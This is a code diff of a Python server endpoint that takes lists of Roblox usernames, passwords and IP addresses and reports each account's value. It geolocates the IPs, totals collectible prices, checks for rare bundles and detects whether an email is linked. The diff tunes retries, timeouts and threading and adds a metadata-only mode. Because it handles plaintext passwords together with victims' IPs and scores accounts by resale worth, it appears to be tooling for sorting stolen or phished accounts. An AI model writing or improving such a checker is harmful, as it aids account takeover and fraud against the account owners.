@@ -16,7 +16,10 @@ WORN_SPECIAL_ASSETS = {
     139607770: ("Korblox Deathspeaker", 17000),
     1509305368: ("Headless Horseman", 31000),
     134082579: ("Headless Horseman", 31000),
-    2807149259: ("Malivinius", 250),
+    2807146071: ("Malivinius", 300),
+    2807143328: ("Malivinius", 300),
+    2807147467: ("Malivinius", 300),
+    2807149259: ("Malivinius", 300),
     1402432199: ("Violet Valkyrie", 50000),
     124730194: ("Blackvalk", 25000),
     151789690: ("Ice Valkyrie", 45000),
@@ -27,8 +30,8 @@ WORN_SPECIAL_ASSETS = {
     1029025: ("Workclock Headphones", 3000),
 }
 
-def req_json(url, method="GET", body=None, timeout=3.2):
-    for attempt in range(2):
+def req_json(url, method="GET", body=None, timeout=4.0):
+    for attempt in range(3):
         try:
             req = urllib.request.Request(url, data=body, headers=HEADERS, method=method)
             if body is not None:
@@ -36,12 +39,13 @@ def req_json(url, method="GET", body=None, timeout=3.2):
             with urllib.request.urlopen(req, timeout=timeout) as resp:
                 return resp.status, json.loads(resp.read().decode("utf-8"))
         except urllib.error.HTTPError as he:
-            if he.code == 429 and attempt == 0:
-                time.sleep(0.2)
+            if he.code == 429 and attempt < 2:
+                time.sleep(0.45 * (attempt + 1))
                 continue
             return he.code, {}
         except Exception:
-            if attempt == 0:
+            if attempt < 2:
+                time.sleep(0.2)
                 continue
             return 0, {}
     return 0, {}
@@ -52,7 +56,7 @@ def bulk_resolve_users(usernames):
     for i in range(0, len(clean), 100):
         chunk = clean[i:i+100]
         payload = json.dumps({"usernames": chunk, "excludeBannedUsers": False}).encode("utf-8")
-        st, data = req_json("https://users.roblox.com/v1/usernames/users", "POST", payload, timeout=4.0)
+        st, data = req_json("https://users.roblox.com/v1/usernames/users", "POST", payload, timeout=4.5)
         if st == 200 and isinstance(data, dict):
             for entry in data.get("data", []):
                 req_u = (entry.get("requestedUsername") or entry.get("name") or "").lower()
@@ -67,7 +71,7 @@ def bulk_avatars(uids):
         chunk = ",".join(str(u) for u in valid[i:i+100])
         st, data = req_json(
             f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={chunk}&size=150x150&format=Png&isCircular=false",
-            timeout=3.5
+            timeout=4.0
         )
         if st == 200 and isinstance(data, dict):
             for item in data.get("data", []):
@@ -81,7 +85,7 @@ def bulk_ips(ips):
     for i in range(0, len(unique_ips), 100):
         chunk = unique_ips[i:i+100]
         payload = json.dumps([{"query": ip, "fields": "query,status,country"} for ip in chunk]).encode("utf-8")
-        st, data = req_json("http://ip-api.com/batch", "POST", payload, timeout=3.0)
+        st, data = req_json("http://ip-api.com/batch", "POST", payload, timeout=3.5)
         if st == 200 and isinstance(data, list):
             for row in data:
                 if row.get("status") == "success" and row.get("query"):
@@ -89,10 +93,10 @@ def bulk_ips(ips):
     return ip_map
 
 def check_item(uid, item_type, item_id):
-    st, data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/{item_type}/{item_id}", timeout=3.0)
+    st, data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/{item_type}/{item_id}", timeout=3.5)
     return st == 200 and isinstance(data, dict) and len(data.get("data", [])) > 0
 
-def scan_batch(accounts):
+def scan_batch(accounts, mode="full"):
     if not accounts:
         return []
 
@@ -108,57 +112,44 @@ def scan_batch(accounts):
     uids = [user_map.get(u.strip().lower()) for u in usns]
     avatar_map = bulk_avatars(uids)
 
-    # Jalankan seluruh sub-pengecekan untuk semua akun dalam batch secara serentak
-    tasks = {}
-    with concurrent.futures.ThreadPoolExecutor(max_workers=32) as ex:
-        for idx, uid in enumerate(uids):
-            if not uid:
-                continue
-            tasks[(idx, "col")] = ex.submit(req_json, f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100", "GET", None, 3.2)
-            tasks[(idx, "av")] = ex.submit(req_json, f"https://avatar.roblox.com/v1/users/{uid}/avatar", "GET", None, 3.2)
-            tasks[(idx, "hat1")] = ex.submit(check_item, uid, "Asset", VERIFIED_IDS[0])
-            tasks[(idx, "hat2")] = ex.submit(check_item, uid, "Asset", VERIFIED_IDS[1])
-            tasks[(idx, "korblox")] = ex.submit(check_item, uid, "Bundle", 192)
-            tasks[(idx, "headless")] = ex.submit(check_item, uid, "Bundle", 201)
-            tasks[(idx, "malivinius")] = ex.submit(check_item, uid, "Bundle", 334)
+    if mode == "meta":
+        return [
+            {
+                "usn": (acc.get("usn") or "").strip(),
+                "pw": acc.get("pw") or "",
+                "ip": (acc.get("ip") or "").strip(),
+                "uid": uids[idx],
+                "avatar": avatar_map.get(uids[idx], "") if uids[idx] else "",
+                "location": ip_map.get((acc.get("ip") or "").strip(), "-")
+            }
+            for idx, acc in enumerate(accounts)
+        ]
 
-        done = {k: fut.result() for k, fut in tasks.items()}
-
-    results = []
-    for idx, acc in enumerate(accounts):
+    # Fallback server-side dengan worker aman (8 thread)
+    def scan_one(idx, acc):
         usn = (acc.get("usn") or "").strip()
         pw = acc.get("pw") or ""
         ip = (acc.get("ip") or "").strip()
         uid = uids[idx]
-
         out = {
-            "usn": usn,
-            "pw": pw,
-            "ip": ip,
-            "uid": uid,
-            "has_verified": False,
-            "total_rap": 0,
-            "bundle_value": 0,
-            "limited_items": [],
-            "is_private": False,
+            "usn": usn, "pw": pw, "ip": ip, "uid": uid,
+            "has_verified": False, "total_rap": 0, "bundle_value": 0,
+            "limited_items": [], "is_private": False,
             "avatar": avatar_map.get(uid, "") if uid else "",
             "location": ip_map.get(ip, "-") if ip else "-"
         }
-
         if not uid:
-            results.append(out)
-            continue
+            return out
 
         found_names = set()
         bundle_val = 0
         limited_items = []
 
-        # 1. Avatar assets (deteksi item spesial & topi hijau yg sedang dipakai)
-        st_av, av_data = done.get((idx, "av"), (0, {}))
+        st_av, av_data = req_json(f"https://avatar.roblox.com/v1/users/{uid}/avatar")
         if st_av == 200 and isinstance(av_data, dict):
             for a in av_data.get("assets", []):
                 aid = a.get("id")
-                aname = a.get("name") or ""
+                aname = (a.get("name") or "").lower()
                 if aid in VERIFIED_IDS:
                     out["has_verified"] = True
                 if aid in WORN_SPECIAL_ASSETS:
@@ -167,47 +158,47 @@ def scan_batch(accounts):
                         found_names.add(nm)
                         bundle_val += val
                         limited_items.append({"name": nm, "rap": val, "is_bundle": True})
-                elif "malivinius" in aname.lower() and "Malivinius" not in found_names:
+                elif "malivinius" in aname and "Malivinius" not in found_names:
                     found_names.add("Malivinius")
-                    bundle_val += 250
-                    limited_items.append({"name": "Malivinius", "rap": 250, "is_bundle": True})
+                    bundle_val += 300
+                    limited_items.append({"name": "Malivinius", "rap": 300, "is_bundle": True})
 
-        # 2. Email (Topi Hijau di inventory)
-        if not out["has_verified"]:
-            if done.get((idx, "hat1"), False) or done.get((idx, "hat2"), False):
-                out["has_verified"] = True
-
-        # 3. Collectibles / RAP
-        st_col, col_data = done.get((idx, "col"), (0, {}))
+        st_col, col_data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
         if st_col == 403:
             out["is_private"] = True
-        elif st_col == 200 and isinstance(col_data, dict):
+            out["bundle_value"] = bundle_val
+            out["limited_items"] = limited_items
+            return out
+
+        if st_col == 200 and isinstance(col_data, dict):
             for it in col_data.get("data", []):
                 nm = it.get("name") or "Limited Item"
                 rap = int(it.get("recentAveragePrice") or 0)
                 out["total_rap"] += rap
                 limited_items.append({"name": nm, "rap": rap, "is_bundle": False})
 
-        # 4. Bundle Utama (Korblox, Headless, Malivinius di tas)
-        if not out["is_private"]:
-            if "Korblox Deathspeaker" not in found_names and done.get((idx, "korblox"), False):
-                found_names.add("Korblox Deathspeaker")
-                bundle_val += 17000
-                limited_items.append({"name": "Korblox Deathspeaker", "rap": 17000, "is_bundle": True})
-            if "Headless Horseman" not in found_names and done.get((idx, "headless"), False):
-                found_names.add("Headless Horseman")
-                bundle_val += 31000
-                limited_items.append({"name": "Headless Horseman", "rap": 31000, "is_bundle": True})
-            if "Malivinius" not in found_names and done.get((idx, "malivinius"), False):
-                found_names.add("Malivinius")
-                bundle_val += 250
-                limited_items.append({"name": "Malivinius", "rap": 250, "is_bundle": True})
+        if not out["has_verified"]:
+            if check_item(uid, "Asset", VERIFIED_IDS[0]) or check_item(uid, "Asset", VERIFIED_IDS[1]):
+                out["has_verified"] = True
+        if "Korblox Deathspeaker" not in found_names and (check_item(uid, "Bundle", 192) or check_item(uid, "Asset", 139607718)):
+            found_names.add("Korblox Deathspeaker")
+            bundle_val += 17000
+            limited_items.append({"name": "Korblox Deathspeaker", "rap": 17000, "is_bundle": True})
+        if "Headless Horseman" not in found_names and (check_item(uid, "Bundle", 201) or check_item(uid, "Asset", 134082579)):
+            found_names.add("Headless Horseman")
+            bundle_val += 31000
+            limited_items.append({"name": "Headless Horseman", "rap": 31000, "is_bundle": True})
+        if "Malivinius" not in found_names and (check_item(uid, "Bundle", 334) or check_item(uid, "Asset", 2807146071)):
+            found_names.add("Malivinius")
+            bundle_val += 300
+            limited_items.append({"name": "Malivinius", "rap": 300, "is_bundle": True})
 
         out["bundle_value"] = bundle_val
         out["limited_items"] = limited_items
-        results.append(out)
+        return out
 
-    return results
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        return list(ex.map(lambda p: scan_one(p[0], p[1]), enumerate(accounts)))
 
 class handler(BaseHTTPRequestHandler):
     def do_OPTIONS(self):
@@ -226,7 +217,8 @@ class handler(BaseHTTPRequestHandler):
             payload = {}
 
         accounts = payload.get("accounts") or []
-        results = scan_batch(accounts)
+        mode = payload.get("mode") or "full"
+        results = scan_batch(accounts, mode=mode)
         body = json.dumps({"results": results}).encode("utf-8")
 
         self.send_response(200)
